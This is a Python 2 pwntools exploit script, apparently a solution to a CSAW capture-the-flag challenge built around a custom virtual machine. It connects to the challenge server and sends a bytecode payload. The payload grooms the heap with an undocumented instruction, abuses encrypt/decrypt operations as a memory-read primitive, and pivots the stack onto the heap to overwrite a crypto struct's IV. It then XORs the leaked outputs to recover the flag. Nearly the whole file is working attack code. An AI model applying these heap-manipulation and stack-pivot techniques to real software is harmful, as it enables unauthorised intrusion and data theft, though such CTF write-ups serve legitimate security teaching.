#!/usr/bin/env python2
from pwn import *
import re

s = remote('pwn.chal.csaw.io', 1007)
# s = process('./tvm')

KAX = '\x0A'
KBX = '\x0B'
KCX = '\x0C'
KDX = '\x0D'
KPC = '\x0E'
KRX = '\x0F'
KSP = '\x10'
DST = '\xDD'
HLT = '\xFE'
MOV  = '\x88'
MOVI = '\x89'
PUSH = '\xED'
POP = '\xB1'
ADD = '\xD3'
ADDI = '\xC6'
SUB = '\xD8'
SUBI = '\xEF'
MUL = '\x34'
DIV = '\xB9'
XOR = '\xB7'
CMP = '\xCC'
JMP = '\x96'
JE = '\x81'
JNE = '\x9E'
JG = '\x2F'
JGE = '\xF4'
JL = '\x69'
JLE = '\x5F'
LDF = '\xD9'
AGE = '\x9B'
AGD = '\x7F'
RSC = '\x42\x3f'  # Undocumented instruction you find from RE'ing

payload = ''.join([
    RSC, RSC, RSC,  # Enough to get the structs close on the heap

    # Dump the encrypted flag
    LDF,
    DST,

    # Pop one of the heap pointers on the stack
    # This should now be right behind the one used to encrypt the flag
    POP, KAX,

    # Increment to point KAX at the start of the struct with the flag's IV
    ADDI, KAX, p64(0x20),

    # Use a read primitive of encrypt+decrypt memory to leak the struct, push it on stack
    AGE, KAX,
    AGD,
    PUSH, KRX,

    # Now reset, saving the closest structs addr in KAX
    RSC,
    POP, KAX,

    # Move to just before the current crypto struct so we can PUSH on it
    ADDI, KAX, p64(0x18),

    # Pivot the stack to the heap right before the crypto struct
    # Overwrite it with the struct containing the flag's IV
    MOV, KSP, KAX,
    PUSH, KRX,

    # Encrypt a test message using that flag's IV, dump pt/ct
    MOVI, KAX, p64(0x4045b0),  # Test message found in the binary: '##############################'
    AGE, KAX,
    DST,
    AGD
])

print 'payload:', `payload`

s.send(payload)
res = s.readall()
bufs = list(re.findall(r'KRX: \[([^\]]+)\]', res))

'''
We should have three states printed, the KRX buffers have:
    - The encrypted flag
    - An encrypted test message that used the SAME IV as the flag
    - Plaintext of the test message
XOR'ing all three results will give the flag
'''

def xor(s1, s2):
    return ''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(s1, s2))

flag = '\x00'*32
for buf in bufs:
    b = buf.replace(' ', '').decode('hex')
    flag = xor(flag, b)
print flag
